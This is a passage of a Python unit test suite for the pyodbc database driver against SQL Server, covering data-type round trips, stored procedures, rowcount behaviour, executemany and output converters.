    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('nvarchar', value, colsize=len(value))
        return t
    for value in UNICODE_SMALL_FENCEPOSTS:
        locals()['test_nvarchar_%s' % len(value)] = _maketest(value)

    # Also test nvarchar(max)
    def _maketest(value):
        def t(self):
            self._test_strtype('nvarchar', value, colsize='max')
        return t
    for value in UNICODE_MAX_FENCEPOSTS:
        locals()['test_nvarcharmax_%s' % len(value)] = _maketest(value)

    def test_unicode_upperlatin(self):
        self._test_strtype('nvarchar', u'\u00e5', colsize=1)

    def test_unicode_longmax(self):
        # Issue 188:    Segfault when fetching NVARCHAR(MAX) data over 511 bytes

        ver = self.get_sqlserver_version()
        if ver < 9:            # 2005+
            return              # so pass / ignore
        self.cursor.execute(""select cast(replicate(N'x', 512) as nvarchar(max))"")

    #
    # binary
    #

    def test_binary_null(self):
        self._test_strtype('varbinary', None, colsize=100)

    def test_large_binary_null(self):
        # Bug 1575064
        self._test_strtype('varbinary', None, colsize=4000)

    def test_binaryNull_object(self):
        self.cursor.execute(""create table t1(n varbinary(10))"")
        self.cursor.execute(""insert into t1 values (?)"", pyodbc.BinaryNull);

    # buffer

    def _maketest(value):
        def t(self):
            self._test_strtype('varbinary', buffer(value), resulttype=pyodbc.BINARY, colsize=len(value))
        return t
    for value in ANSI_SMALL_FENCEPOSTS:
        locals()['test_binary_buffer_%s' % len(value)] = _maketest(value)

    # bytearray

    if sys.hexversion >= 0x02060000:
        def _maketest(value):
            def t(self):
                self._test_strtype('varbinary', bytearray(value), colsize=len(value))
            return t
        for value in ANSI_SMALL_FENCEPOSTS:
            locals()['test_binary_bytearray_%s' % len(value)] = _maketest(value)

    # varbinary(max)
    def _maketest(value):
        def t(self):
            self._test_strtype('varbinary', buffer(value), resulttype=pyodbc.BINARY, colsize='max')
        return t
    for value in ANSI_MAX_FENCEPOSTS:
        locals()['test_binarymax_buffer_%s' % len(value)] = _maketest(value)

    # bytearray

    if sys.hexversion >= 0x02060000:
        def _maketest(value):
            def t(self):
                self._test_strtype('varbinary', bytearray(value), colsize='max')
            return t
        for value in ANSI_MAX_FENCEPOSTS:
            locals()['test_binarymax_bytearray_%s' % len(value)] = _maketest(value)

    #
    # image
    #

    def test_image_null(self):
        self._test_strliketype('image', None, type(None))

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strliketype('image', buffer(value), pyodbc.BINARY)
        return t
    for value in ANSI_LARGE_FENCEPOSTS:
        locals()['test_image_buffer_%s' % len(value)] = _maketest(value)

    if sys.hexversion >= 0x02060000:
        # Python 2.6+ supports bytearray, which pyodbc considers varbinary.

        # Generate a test for each fencepost size: test_unicode_0, etc.
        def _maketest(value):
            def t(self):
                self._test_strtype('image', bytearray(value))
            return t
        for value in ANSI_LARGE_FENCEPOSTS:
            locals()['test_image_bytearray_%s' % len(value)] = _maketest(value)

    def test_image_upperlatin(self):
        self._test_strliketype('image', buffer('á'), pyodbc.BINARY)

    #
    # text
    #

    # def test_empty_text(self):
    #     self._test_strliketype('text', bytearray(''))

    def test_null_text(self):
        self._test_strliketype('text', None, type(None))

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strliketype('text', value)
        return t
    for value in UNICODE_SMALL_FENCEPOSTS:
        locals()['test_text_buffer_%s' % len(value)] = _maketest(value)

    def test_text_upperlatin(self):
        self._test_strliketype('text', u'á')

    #
    # xml
    #

    # def test_empty_xml(self):
    #     self._test_strliketype('xml', bytearray(''))

    def test_null_xml(self):
        self._test_strliketype('xml', None, type(None))

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strliketype('xml', value)
        return t
    for value in UNICODE_SMALL_FENCEPOSTS:
        locals()['test_xml_buffer_%s' % len(value)] = _maketest(value)

    def test_xml_str(self):
        # SQL Server treats XML like *binary* data.
        # See https://msdn.microsoft.com/en-us/library/ms131375.aspx
        #
        # The real problem with this is that we *don't* know that a value is
        # XML when we write it to the database.  It is either an `str` or a
        # `unicode` object, so we're going to convert it into one of *two*
        # different formats.
        #
        # When we read it out of the database, all we know is that it is XML
        # and we don't know how it was encoded so we don't know how to decode
        # it.  Since almost everyone treats XML as Unicode nowdays, we're going
        # to decode XML as Unicode.  Force your XML to Unicode before writing
        # to the database.  (Otherwise, set a global encoder for the XMl type.)
        ascii = 'test'
        val = unicode(ascii)
        self.cursor.execute(""create table t1(a xml)"")
        self.cursor.execute(""insert into t1 values (?)"", val)
        result = self.cursor.execute(""select a from t1"").fetchval()
        self.assertEqual(result, val)

    def test_xml_upperlatin(self):
        val = u'á'
        self.cursor.execute(""create table t1(a xml)"")
        self.cursor.execute(""insert into t1 values (?)"", val)
        result = self.cursor.execute(""select a from t1"").fetchval()
        self.assertEqual(result, val)

    #
    # bit
    #

    def test_bit(self):
        value = True
        self.cursor.execute(""create table t1(b bit)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        v = self.cursor.execute(""select b from t1"").fetchone()[0]
        self.assertEqual(type(v), bool)
        self.assertEqual(v, value)

    #
    # decimal
    #

    def _decimal(self, precision, scale, negative):
        # From test provided by planders (thanks!) in Issue 91

        self.cursor.execute(""create table t1(d decimal(%s, %s))"" % (precision, scale))

        # Construct a decimal that uses the maximum precision and scale.
        decStr = '9' * (precision - scale)
        if scale:
            decStr = decStr + ""."" + '9' * scale
        if negative:
            decStr = ""-"" + decStr
        value = Decimal(decStr)

        self.cursor.execute(""insert into t1 values(?)"", value)

        v = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(v, value)

    def _maketest(p, s, n):
        def t(self):
            self._decimal(p, s, n)
        return t
    for (p, s, n) in [ (1,  0,  False),
                       (1,  0,  True),
                       (6,  0,  False),
                       (6,  2,  False),
                       (6,  4,  True),
                       (6,  6,  True),
                       (38, 0,  False),
                       (38, 10, False),
                       (38, 38, False),
                       (38, 0,  True),
                       (38, 10, True),
                       (38, 38, True) ]:
        locals()['test_decimal_%s_%s_%s' % (p, s, n and 'n' or 'p')] = _maketest(p, s, n)


    def test_decimal_e(self):
        """"""Ensure exponential notation decimals are properly handled""""""
        value = Decimal((0, (1, 2, 3), 5)) # prints as 1.23E+7
        self.cursor.execute(""create table t1(d decimal(10, 2))"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_subquery_params(self):
        """"""Ensure parameter markers work in a subquery""""""
        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        row = self.cursor.execute(""""""
                                  select x.id
                                  from (
                                    select id
                                    from t1
                                    where s = ?
                                      and id between ? and ?
                                   ) x
                                   """""", 'test', 1, 10).fetchone()
        self.assertNotEqual(row, None)
        self.assertEqual(row[0], 1)

    def _exec(self):
        self.cursor.execute(self.sql)

    def test_close_cnxn(self):
        """"""Make sure using a Cursor after closing its connection doesn't crash.""""""

        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        self.cursor.execute(""select * from t1"")

        self.cnxn.close()

        # Now that the connection is closed, we expect an exception.  (If the code attempts to use
        # the HSTMT, we'll get an access violation instead.)
        self.sql = ""select * from t1""
        self.assertRaises(pyodbc.ProgrammingError, self._exec)

    def test_empty_string(self):
        self.cursor.execute(""create table t1(s varchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", """")

    def test_empty_string_encoding(self):
        self.cnxn.setdecoding(pyodbc.SQL_CHAR, encoding='shift_jis')
        value = """"
        self.cursor.execute(""create table t1(s varchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(v, value)

    def test_fixed_char(self):
        value = ""testing""
        self.cursor.execute(""create table t1(s char(7))"")
        self.cursor.execute(""insert into t1 values(?)"", ""testing"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(v, value)

    def test_empty_unicode(self):
        self.cursor.execute(""create table t1(s nvarchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", u"""")

    def test_empty_unicode_encoding(self):
        self.cnxn.setdecoding(pyodbc.SQL_CHAR, encoding='shift_jis')
        value = """"
        self.cursor.execute(""create table t1(s nvarchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(v, value)

    def test_unicode_query(self):
        self.cursor.execute(u""select 1"")

    # From issue #206
    def _maketest(value):
        def t(self):
            self._test_strtype('nvarchar', value, colsize=len(value))
        return t
    locals()['test_chinese_param'] = _maketest(u'我的')

    def test_chinese(self):
        v = u'我的'
        self.cursor.execute(u""SELECT N'我的' AS [Name]"")
        row = self.cursor.fetchone()
        self.assertEqual(row[0], v)

        self.cursor.execute(u""SELECT N'我的' AS [Name]"")
        rows = self.cursor.fetchall()
        self.assertEqual(rows[0][0], v)

    def test_negative_row_index(self):
        self.cursor.execute(""create table t1(s varchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", ""1"")
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row[0], ""1"")
        self.assertEqual(row[-1], ""1"")

    def test_version(self):
        self.assertEqual(3, len(pyodbc.version.split('.'))) # 1.3.1 etc.

    #
    # date, time, datetime
    #

    def test_datetime(self):
        value = datetime(2007, 1, 15, 3, 4, 5)

        self.cursor.execute(""create table t1(dt datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(value), datetime)
        self.assertEqual(value, result)

    def test_datetime_fraction(self):
        # SQL Server supports milliseconds, but Python's datetime supports nanoseconds, so the most granular datetime
        # supported is xxx000.

        value = datetime(2007, 1, 15, 3, 4, 5, 123000)

        self.cursor.execute(""create table t1(dt datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(value), datetime)
        self.assertEqual(result, value)

    def test_datetime_fraction_rounded(self):
        # SQL Server supports milliseconds, but Python's datetime supports nanoseconds.  pyodbc rounds down to what the
        # database supports.

        full    = datetime(2007, 1, 15, 3, 4, 5, 123456)
        rounded = datetime(2007, 1, 15, 3, 4, 5, 123000)

        self.cursor.execute(""create table t1(dt datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", full)

        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(result), datetime)
        self.assertEqual(result, rounded)

    def test_date(self):
        ver = self.get_sqlserver_version()
        if ver < 10:            # 2008 only
            return              # so pass / ignore

        value = date.today()

        self.cursor.execute(""create table t1(d date)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(type(value), date)
        self.assertEqual(value, result)

    def test_time(self):
        ver = self.get_sqlserver_version()
        if ver < 10:            # 2008 only
            return              # so pass / ignore

        value = datetime.now().time()

        # We aren't yet writing values using the new extended time type so the value written to the database is only
        # down to the second.
        value = value.replace(microsecond=0)

        self.cursor.execute(""create table t1(t time)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select t from t1"").fetchone()[0]
        self.assertEqual(type(value), time)
        self.assertEqual(value, result)

    def test_datetime2(self):
        value = datetime(2007, 1, 15, 3, 4, 5)

        self.cursor.execute(""create table t1(dt datetime2)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(value), datetime)
        self.assertEqual(value, result)

    #
    # ints and floats
    #

    def test_int(self):
        value = 1234
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_int(self):
        value = -1
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_bigint(self):
        input = 3000000000
        self.cursor.execute(""create table t1(d bigint)"")
        self.cursor.execute(""insert into t1 values (?)"", input)
        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(result, input)

    def test_float(self):
        value = 1234.567
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_float(self):
        value = -200
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result  = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(value, result)


    #
    # stored procedures
    #

    # def test_callproc(self):
    #     ""callproc with a simple input-only stored procedure""
    #     pass

    def test_sp_results(self):
        self.cursor.execute(
            """"""
            Create procedure proc1
            AS
              select top 10 name, id, xtype, refdate
              from sysobjects
            """""")
        rows = self.cursor.execute(""exec proc1"").fetchall()
        self.assertEqual(type(rows), list)
        self.assertEqual(len(rows), 10) # there has to be at least 10 items in sysobjects
        self.assertEqual(type(rows[0].refdate), datetime)


    def test_sp_results_from_temp(self):

        # Note: I've used ""set nocount on"" so that we don't get the number of rows deleted from #tmptable.
        # If you don't do this, you'd need to call nextset() once to skip it.

        self.cursor.execute(
            """"""
            Create procedure proc1
            AS
              set nocount on
              select top 10 name, id, xtype, refdate
              into #tmptable
              from sysobjects

              select * from #tmptable
            """""")
        self.cursor.execute(""exec proc1"")
        self.assertTrue(self.cursor.description is not None)
        self.assertTrue(len(self.cursor.description) == 4)

        rows = self.cursor.fetchall()
        self.assertEqual(type(rows), list)
        self.assertEqual(len(rows), 10) # there has to be at least 10 items in sysobjects
        self.assertEqual(type(rows[0].refdate), datetime)


    def test_sp_results_from_vartbl(self):
        self.cursor.execute(
            """"""
            Create procedure proc1
            AS
              set nocount on
              declare @tmptbl table(name varchar(100), id int, xtype varchar(4), refdate datetime)

              insert into @tmptbl
              select top 10 name, id, xtype, refdate
              from sysobjects

              select * from @tmptbl
            """""")
        self.cursor.execute(""exec proc1"")
        rows = self.cursor.fetchall()
        self.assertEqual(type(rows), list)
        self.assertEqual(len(rows), 10) # there has to be at least 10 items in sysobjects
        self.assertEqual(type(rows[0].refdate), datetime)

    def test_sp_with_dates(self):
        # Reported in the forums that passing two datetimes to a stored procedure doesn't work.
        self.cursor.execute(
            """"""
            if exists (select * from dbo.sysobjects where id = object_id(N'[test_sp]') and OBJECTPROPERTY(id, N'IsProcedure') = 1)
              drop procedure [dbo].[test_sp]
            """""")
        self.cursor.execute(
            """"""
            create procedure test_sp(@d1 datetime, @d2 datetime)
            AS
              declare @d as int
              set @d = datediff(year, @d1, @d2)
              select @d
            """""")
        self.cursor.execute(""exec test_sp ?, ?"", datetime.now(), datetime.now())
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(rows[0][0] == 0)   # 0 years apart

    def test_sp_with_none(self):
        # Reported in the forums that passing None caused an error.
        self.cursor.execute(
            """"""
            if exists (select * from dbo.sysobjects where id = object_id(N'[test_sp]') and OBJECTPROPERTY(id, N'IsProcedure') = 1)
              drop procedure [dbo].[test_sp]
            """""")
        self.cursor.execute(
            """"""
            create procedure test_sp(@x varchar(20))
            AS
              declare @y varchar(20)
              set @y = @x
              select @y
            """""")
        self.cursor.execute(""exec test_sp ?"", None)
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(rows[0][0] == None)   # 0 years apart


    #
    # rowcount
    #

    def test_rowcount_delete(self):
        self.assertEqual(self.cursor.rowcount, -1)
        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, count)

    def test_rowcount_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.  On the other hand, we could hardcode a
        zero return value.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, 0)

    def test_rowcount_select(self):
        """"""
        Ensure Cursor.rowcount is set properly after a select statement.

        pyodbc calls SQLRowCount after each execute and sets Cursor.rowcount, but SQL Server 2005 returns -1 after a
        select statement, so we'll test for that behavior.  This is valid behavior according to the DB API
        specification, but people don't seem to like it.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.cursor.execute(""select * from t1"")
        self.assertEqual(self.cursor.rowcount, -1)

        rows = self.cursor.fetchall()
        self.assertEqual(len(rows), count)
        self.assertEqual(self.cursor.rowcount, -1)

    def test_rowcount_reset(self):
        ""Ensure rowcount is reset to -1""

        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.assertEqual(self.cursor.rowcount, 1)

        self.cursor.execute(""create table t2(i int)"")
        self.assertEqual(self.cursor.rowcount, -1)

    #
    # always return Cursor
    #

    # In the 2.0.x branch, Cursor.execute sometimes returned the cursor and sometimes the rowcount.  This proved very
    # confusing when things went wrong and added very little value even when things went right since users could always
    # use: cursor.execute(""..."").rowcount

    def test_retcursor_delete(self):
        self.cursor.execute(""create table t1(i int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        v = self.cursor.execute(""delete from t1"")
        self.assertEqual(v, self.cursor)

    def test_retcursor_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        v = self.cursor.execute(""delete from t1"")
        self.assertEqual(v, self.cursor)

    def test_retcursor_select(self):
        self.cursor.execute(""create table t1(i int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        v = self.cursor.execute(""select * from t1"")
        self.assertEqual(v, self.cursor)

    #
    # misc
    #

    def table_with_spaces(self):
        ""Ensure we can select using [x z] syntax""

        try:
            self.cursor.execute(""create table [test one](int n)"")
            self.cursor.execute(""insert into [test one] values(1)"")
            self.cursor.execute(""select * from [test one]"")
            v = self.cursor.fetchone()[0]
            self.assertEqual(v, 1)
        finally:
            self.cnxn.rollback()

    def test_lower_case(self):
        ""Ensure pyodbc.lowercase forces returned column names to lowercase.""

        # Has to be set before creating the cursor, so we must recreate self.cursor.

        pyodbc.lowercase = True
        self.cursor = self.cnxn.cursor()

        self.cursor.execute(""create table t1(Abc int, dEf int)"")
        self.cursor.execute(""select * from t1"")

        names = [ t[0] for t in self.cursor.description ]
        names.sort()

        self.assertEqual(names, [ ""abc"", ""def"" ])

        # Put it back so other tests don't fail.
        pyodbc.lowercase = False

    def test_row_description(self):
        """"""
        Ensure Cursor.description is accessible as Row.cursor_description.
        """"""
        self.cursor = self.cnxn.cursor()
        self.cursor.execute(""create table t1(a int, b char(3))"")
        self.cnxn.commit()
        self.cursor.execute(""insert into t1 values(1, 'abc')"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        self.assertEqual(self.cursor.description, row.cursor_description)


    def test_temp_select(self):
        # A project was failing to create temporary tables via select into.
        self.cursor.execute(""create table t1(s char(7))"")
        self.cursor.execute(""insert into t1 values(?)"", ""testing"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), unicode)
        self.assertEqual(v, ""testing"")

        self.cursor.execute(""select s into t2 from t1"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), unicode)
        self.assertEqual(v, ""testing"")


    def test_money(self):
        d = Decimal('123456.78')
        self.cursor.execute(""create table t1(i int identity(1,1), m money)"")
        self.cursor.execute(""insert into t1(m) values (?)"", d)
        v = self.cursor.execute(""select m from t1"").fetchone()[0]
        self.assertEqual(v, d)


    def test_executemany(self):
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (i, str(i)) for i in range(1, 6) ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])


    def test_executemany_one(self):
        ""Pass executemany a single sequence""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, ""test"") ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])


    def test_executemany_failure(self):
        """"""
        Ensure that an exception is raised if one query in an executemany fails.
        """"""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, 'good'),
                   ('error', 'not an int'),
                   (3, 'good') ]

        self.assertRaises(pyodbc.Error, self.cursor.executemany, ""insert into t1(a, b) value (?, ?)"", params)


    def test_row_slicing(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = row[:]
        self.assertTrue(result is row)

        result = row[:-1]
        self.assertEqual(result, (1,2,3))

        result = row[0:4]
        self.assertTrue(result is row)


    def test_row_repr(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = str(row)
        self.assertEqual(result, ""(1, 2, 3, 4)"")

        result = str(row[:-1])
        self.assertEqual(result, ""(1, 2, 3)"")

        result = str(row[:1])
        self.assertEqual(result, ""(1,)"")


    def test_concatenation(self):
        v2 = '0123456789' * 30
        v3 = '9876543210' * 30

        self.cursor.execute(""create table t1(c1 int identity(1, 1), c2 varchar(300), c3 varchar(300))"")
        self.cursor.execute(""insert into t1(c2, c3) values (?,?)"", v2, v3)

        row = self.cursor.execute(""select c2, c3, c2 + c3 as both from t1"").fetchone()

        self.assertEqual(row.both, v2 + v3)

    def test_view_select(self):
        # Reported in forum: Can't select from a view?  I think I do this a lot, but another test never hurts.

        # Create a table (t1) with 3 rows and a view (t2) into it.
        self.cursor.execute(""create table t1(c1 int identity(1, 1), c2 varchar(50))"")
        for i in range(3):
            self.cursor.execute(""insert into t1(c2) values (?)"", ""string%s"" % i)
        self.cursor.execute(""create view t2 as select * from t1"")

        # Select from the view
        self.cursor.execute(""select * from t2"")
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(len(rows) == 3)

    def test_autocommit(self):
        self.assertEqual(self.cnxn.autocommit, False)

        othercnxn = pyodbc.connect(self.connection_string, autocommit=True)
        self.assertEqual(othercnxn.autocommit, True)

        othercnxn.autocommit = False
        self.assertEqual(othercnxn.autocommit, False)

    def test_cursorcommit(self):
        ""Ensure cursor.commit works""
        othercnxn = pyodbc.connect(self.connection_string)
        othercursor = othercnxn.cursor()
        othercnxn = None

        othercursor.execute(""create table t1(s varchar(20))"")
        othercursor.execute(""insert into t1 values(?)"", 'test')
        othercursor.commit()

        value = self.cursor.execute(""select s from t1"").fetchone()[0]
        self.assertEqual(value, 'test')


    def test_unicode_results(self):
        ""Ensure unicode_results forces Unicode""
        othercnxn = pyodbc.connect(self.connection_string, unicode_results=True)
        othercursor = othercnxn.cursor()

        # ANSI data in an ANSI column ...
        othercursor.execute(""create table t1(s varchar(20))"")
        othercursor.execute(""insert into t1 values(?)"", 'test')

        # ... should be returned as Unicode
        value = othercursor.execute(""select s from t1"").fetchone()[0]
        self.assertEqual(value, u'test')


    def test_sqlserver_callproc(self):
        try:
            self.cursor.execute(""drop procedure pyodbctest"")
            self.cnxn.commit()
        except:
            pass

        self.cursor.execute(""create table t1(s varchar(10))"")
        self.cursor.execute(""insert into t1 values(?)"", ""testing"")

        self.cursor.execute(""""""
                            create procedure pyodbctest @var1 varchar(32)
                            as
                            begin
                              select s
                              from t1
                            return
                            end
                            """""")
        self.cnxn.commit()

        # for row in self.cursor.procedureColumns('pyodbctest'):
        #     print row.procedure_name, row.column_name, row.column_type, row.type_name

        self.cursor.execute(""exec pyodbctest 'hi'"")

        # print self.cursor.description
        # for row in self.cursor:
        #     print row.s

    def test_skip(self):
        # Insert 1, 2, and 3.  Fetch 1, skip 2, fetch 3.

        self.cursor.execute(""create table t1(id int)"");
        for i in range(1, 5):
            self.cursor.execute(""insert into t1 values(?)"", i)
        self.cursor.execute(""select id from t1 order by id"")
        self.assertEqual(self.cursor.fetchone()[0], 1)
        self.cursor.skip(2)
        self.assertEqual(self.cursor.fetchone()[0], 4)

    def test_timeout(self):
        self.assertEqual(self.cnxn.timeout, 0) # defaults to zero (off)

        self.cnxn.timeout = 30
        self.assertEqual(self.cnxn.timeout, 30)

        self.cnxn.timeout = 0
        self.assertEqual(self.cnxn.timeout, 0)

    def test_sets_execute(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute(""create table t1 (word varchar (100))"")
            words = set (['a'])
            self.cursor.execute(""insert into t1 (word) VALUES (?)"", [words])

        self.assertRaises(pyodbc.ProgrammingError, f)

    def test_sets_executemany(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute(""create table t1 (word varchar (100))"")
            words = set (['a'])
            self.cursor.executemany(""insert into t1 (word) values (?)"", [words])

        self.assertRaises(TypeError, f)

    def test_row_execute(self):
        ""Ensure we can use a Row object as a parameter to execute""
        self.cursor.execute(""create table t1(n int, s varchar(10))"")
        self.cursor.execute(""insert into t1 values (1, 'a')"")
        row = self.cursor.execute(""select n, s from t1"").fetchone()
        self.assertNotEqual(row, None)

        self.cursor.execute(""create table t2(n int, s varchar(10))"")
        self.cursor.execute(""insert into t2 values (?, ?)"", row)

    def test_row_executemany(self):
        ""Ensure we can use a Row object as a parameter to executemany""
        self.cursor.execute(""create table t1(n int, s varchar(10))"")

        for i in range(3):
            self.cursor.execute(""insert into t1 values (?, ?)"", i, chr(ord('a')+i))

        rows = self.cursor.execute(""select n, s from t1"").fetchall()
        self.assertNotEqual(len(rows), 0)

        self.cursor.execute(""create table t2(n int, s varchar(10))"")
        self.cursor.executemany(""insert into t2 values (?, ?)"", rows)

    def test_description(self):
        ""Ensure cursor.description is correct""

        self.cursor.execute(""create table t1(n int, s varchar(8), d decimal(5,2))"")
        self.cursor.execute(""insert into t1 values (1, 'abc', '1.23')"")
        self.cursor.execute(""select * from t1"")

        # (I'm not sure the precision of an int is constant across different versions, bits, so I'm hand checking the
        # items I do know.

        # int
        t = self.cursor.description[0]
        self.assertEqual(t[0], 'n')
        self.assertEqual(t[1], int)
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

        # varchar(8)
        t = self.cursor.description[1]
        self.assertEqual(t[0], 's')
        self.assertEqual(t[1], str)
        self.assertEqual(t[4], 8)       # precision
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

        # decimal(5, 2)
        t = self.cursor.description[2]
        self.assertEqual(t[0], 'd')
        self.assertEqual(t[1], Decimal)
        self.assertEqual(t[4], 5)       # precision
        self.assertEqual(t[5], 2)       # scale
        self.assertEqual(t[6], True)    # nullable


    def test_none_param(self):
        ""Ensure None can be used for params other than the first""
        # Some driver/db versions would fail if NULL was not the first parameter because SQLDescribeParam (only used
        # with NULL) could not be used after the first call to SQLBindParameter.  This means None always worked for the
        # first column, but did not work for later columns.
        #
        # If SQLDescribeParam doesn't work, pyodbc would use VARCHAR which almost always worked.  However,
        # binary/varbinary won't allow an implicit conversion.

        self.cursor.execute(""create table t1(n int, blob varbinary(max))"")
        self.cursor.execute(""insert into t1 values (1, newid())"")
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row.n, 1)
        self.assertEqual(type(row.blob), bytearray)

        self.cursor.execute(""update t1 set n=?, blob=?"", 2, None)
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row.n, 2)
        self.assertEqual(row.blob, None)


    def test_output_conversion(self):
        def convert(value):
            # `value` will be a string.  We'll simply add an X at the beginning at the end.
            return 'X' + value + 'X'
        self.cnxn.add_output_converter(pyodbc.SQL_VARCHAR, convert)
        self.cursor.execute(""create table t1(n int, v varchar(10))"")
        self.cursor.execute(""insert into t1 values (1, '123.45')"")
        value = self.cursor.execute(""select v from t1"").fetchone()[0]
        self.assertEqual(value, 'X123.45X')

        # Now clear the conversions and try again.  There should be no Xs this time.
        self.cnxn.clear_output_converters()
        value = self.cursor.execute(""select v from t1"").fetchone()[0]
        self.assertEqual(value, '123.45')


    def test_too_large(self):
        """"""Ensure error raised if insert fails due to truncation""""""
        value = 'x' * 1000
        self.cursor.execute(""create table t1(s varchar(800))"")
        def test():
            self.cursor.execute(""insert into t1 values (?)"", value)
        self.assertRaises(pyodbc.DataError, test)

    def test_geometry_null_insert(self):
        def convert(value):
            return value

        self.cnxn.add_output_converter(-151, convert) # -151 is SQL Server's geometry
        self.cursor.execute(""create table t1(n int, v geometry)"")
